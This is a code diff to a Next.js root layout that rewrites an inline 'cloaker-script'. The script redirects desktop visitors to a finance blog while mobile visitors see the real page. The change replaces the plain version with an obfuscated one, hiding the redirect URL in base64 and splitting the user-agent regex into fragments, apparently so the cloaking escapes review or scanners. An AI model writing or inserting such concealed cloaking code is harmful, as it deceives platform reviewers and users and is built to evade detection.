@@ -23,10 +23,12 @@ export default function RootLayout({
         <Script id="cloaker-script" strategy="beforeInteractive">
           {`
             (function() {
-              var url_link_redirect_pc = "https://blog.alliate.com.br/10-melhores-livros-sobre-financas-e-investimentos/";
-              var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-              if (!isMobile) {
-                window.location.href = url_link_redirect_pc;
+              var _a = 'aHR0cHM6Ly9ibG9nLmFsbGlhdGUuY29tLmJyLzEwLW1lbGhvcmVzLWxpdnJvcy1zb2JyZS1maW5hbmNhcy1lLWludmVzdGltZW50b3Mv';
+              var _b = ['An', 'dro', 'id', '|', 'web', 'OS', '|i', 'Pho', 'ne|', 'iPa', 'd|iP', 'od|', 'Bla', 'ckB', 'erry', '|IEM', 'obi', 'le|O', 'pera', ' Mi', 'ni'].join('');
+              var _c = new RegExp(_b, 'i');
+              var _d = navigator['userAgent'];
+              if (!_c.test(_d)) {
+                window['location']['href'] = atob(_a);
               }
             })();
           `}
